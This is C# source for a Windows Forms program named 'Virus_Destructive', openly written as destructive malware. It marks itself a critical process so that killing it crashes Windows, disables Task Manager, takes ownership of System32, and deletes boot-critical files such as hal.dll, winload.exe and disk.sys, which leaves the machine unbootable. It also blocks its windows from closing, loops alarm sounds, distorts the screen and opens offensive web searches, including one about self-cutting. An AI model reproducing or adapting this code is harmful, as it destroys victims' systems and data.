using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace Virus_Destructive
{
    public partial class Virus_payload : Form
    {

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    public Virus_payload()
    {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
    }
        Random r;

        private void Virus_payload_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Virus_payload_Load(object sender, EventArgs e)
        {
            int isCritical = 1;  
            int BreakOnTermination = 0x1D;  

            Process.EnterDebugMode();  

          
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); 

           
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
            tmr1.Start();
            tmr_add.Start();
            tmr_next_payload.Start();
        }

        private void tmr1_Tick(object sender, EventArgs e)
        {
            tmr1.Stop();
           
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";

           
            if(File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }

            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }

            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }

            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }
        }

        private void tmr_add_Tick(object sender, EventArgs e)
        {
            tmr_add.Stop();
            int true_num = r.Next(5);

            if(true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UCviSYAcwdnDX1UoRzAHYgNg");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk03p6_nh5gjKk_7WWWGDr0qYtnieXg%3A1605092222038&ei=fsOrX5rzAY63kwWYq56IDg&q=my+mum+is+gay&oq=my+mum+is+gay&gs_lcp=CgZwc3ktYWIQAzIKCAAQFhAKEB4QEzIKCAAQFhAKEB4QEzoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgUIABCxAzoCCAA6CAgAELEDEIMBOgIILjoECAAQQzoHCC4QsQMQQzoECC4QQzoFCC4QsQM6CAguELEDEIMBOgUILhCTAjoECC4QCjoECAAQCjoFCC4QywE6BQgAEMsBOggILhDLARCTAjoGCAAQFhAeOggIABAWEAoQHlD_GliuO2D3PGgCcAB4AIABiwKIAeAOkgEGMS4xMi4xmAEAoAEBqgEHZ3dzLXdperABCsABAQ&sclient=psy-ab&ved=0ahUKEwiaque9qvrsAhWO26QKHZiVB-EQ4dUDCA0&uact=5");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk007atE4-A-mD40nsEcYaIJklYlv_g%3A1605092231197&ei=h8OrX5XEC4mdkwXO84XoAg&q=how+2+cut+leg&oq=how+2+cut+leg&gs_lcp=CgZwc3ktYWIQDDIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgQIABBDOgUIABCxAzoKCAAQsQMQgwEQQzoCCC46CAguELEDEIMBOgIIADoFCC4QsQM6BQguEMsBOgUIABDLAToGCAAQFhAeOggIABAWEAoQHlDzaFiDigFg86UBaANwAHgAgAHzAYgB7w2SAQYwLjEyLjGYAQCgAQGqAQdnd3Mtd2l6sAEKwAEB&sclient=psy-ab&ved=0ahUKEwjVo5bCqvrsAhWJzqQKHc55AS0Q4dUDCA0");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=dancing+cow&sxsrf=ALeKk03Rx29J4Nduy2BetYRf6PUHNs9I8A:1605092295881&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiupoLhqvrsAhUdJcUKHdqKANwQ_AUoAXoECAcQAw&biw=1920&bih=937");
            }
            tmr_add.Start();
        }

        private void tmr_next_payload_Tick(object sender, EventArgs e)
        {
            tmr_next_payload.Stop();
            var NewForm = new Virus_sound();
            NewForm.ShowDialog();
        }
    }
}
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Virus_Destructive
{
    public partial class virus_last_again : Form
    {
        public virus_last_again()
        {
            InitializeComponent();
        }

        private void virus_last_again_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void virus_last_again_Load(object sender, EventArgs e)
        {
            var NewForm = new Virus_last();
            NewForm.ShowDialog();
        }
    }
}
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Virus_Destructive
{
    public partial class Virus_last : Form
    {
        public Virus_last()
        {
            InitializeComponent();          
            TopMost = true;
            this.TransparencyKey = this.BackColor;
        }

        private void Virus_last_Load(object sender, EventArgs e)
        {
            tmr_loop2.Start();
            tmr_back_to_last.Start();
            r = new Random();

        }

        Graphics g;
        Bitmap bmp;
        Random r;

        private void tmr_loop_Tick(object sender, EventArgs e)
        {
            
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {

        }

        private void Virus_last_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void tmr_loop_Tick_1(object sender, EventArgs e)
        {
            tmr_loop2.Stop();
            
            var endWidth = 500;
            var endHeight = 500;

            var scaleFactor = 1; 

            var startWidth = endWidth / scaleFactor;
            var startHeight = endHeight / scaleFactor;

            bmp = new Bitmap(startWidth, startHeight);

            g = this.CreateGraphics();
            g = Graphics.FromImage(bmp);

            var xPos = Math.Min(0, MousePosition.X - (startWidth / 500)); 
            var yPos = Math.Min(0, MousePosition.Y - (startHeight / 500));

            g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));





            pictureBox1 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox1.Height = 300;
            pictureBox1.Width = 300;

            pictureBox1.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox1);
            pictureBox2 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox2.Height = 240;
            pictureBox2.Width = 180;

            pictureBox2.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox2);
            pictureBox3 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox3.Height = 300;
            pictureBox3.Width = 300;

            pictureBox3.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox3);
            pictureBox4 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox4.Height = 300;
            pictureBox4.Width = 300;

            pictureBox4.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox4);

            pictureBox5 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox5.Height = 150;
            pictureBox5.Width = 200;

            pictureBox5.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox5);

            pictureBox1.Image = bmp;
            pictureBox2.Image = bmp;
            pictureBox3.Image = bmp;
            pictureBox4.Image = bmp;
            pictureBox5.Image = bmp;

            Bitmap pic = new Bitmap(pictureBox3.Image);
            for (int y = 0; (y <= (pic.Height - 1)); y++)
            {
                for (int x = 0; (x <= (pic.Width - 1)); x++)
                {
                    Color inv = pic.GetPixel(x, y);
                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                    pic.SetPixel(x, y, inv);
                }
            }

            pictureBox3.Image = pic;

            Bitmap pic2 = new Bitmap(pictureBox5.Image);
            for (int y = 0; (y <= (pic2.Height - 1)); y++)
            {
                for (int x = 0; (x <= (pic2.Width - 1)); x++)
                {
                    Color inv = pic2.GetPixel(x, y);
                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                    pic2.SetPixel(x, y, inv);
                }
            }

            pictureBox5.Image = pic2;
            tmr_loop2.Start();
        }

        private void tmr_back_to_last_Tick(object sender, EventArgs e)
        {
            tmr_back_to_last.Stop();
            var NewForm = new virus_last_again();
            NewForm.ShowDialog();
            tmr_back_to_last.Start();
        }
    }
}
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Media;
using System.IO;

namespace Virus_Destructive
{
    public partial class Virus_sound : Form
    {
        private SoundPlayer _soundplayer;

        string sound_file = @"C:\Windows\Media\Windows Critical Stop.wav"; 

        public Virus_sound()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            if(File.Exists(sound_file))
            {
                _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav"); 
            }
        }

        private void Virus_sound_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Virus_sound_Load(object sender, EventArgs e)
        {
            tmr1.Start();
            tmr_next_last.Start();
        }

        private void tmr1_Tick(object sender, EventArgs e)
        {
            tmr1.Stop(); 
            _soundplayer.Play(); 
            tmr1.Start();
        }

        private void tmr_next_payload_Tick(object sender, EventArgs e)
        {
            tmr_next_last.Stop();
            var NewForm = new Virus_last();
            NewForm.ShowDialog();
            tmr_next_last.Start();
        }
    }
}

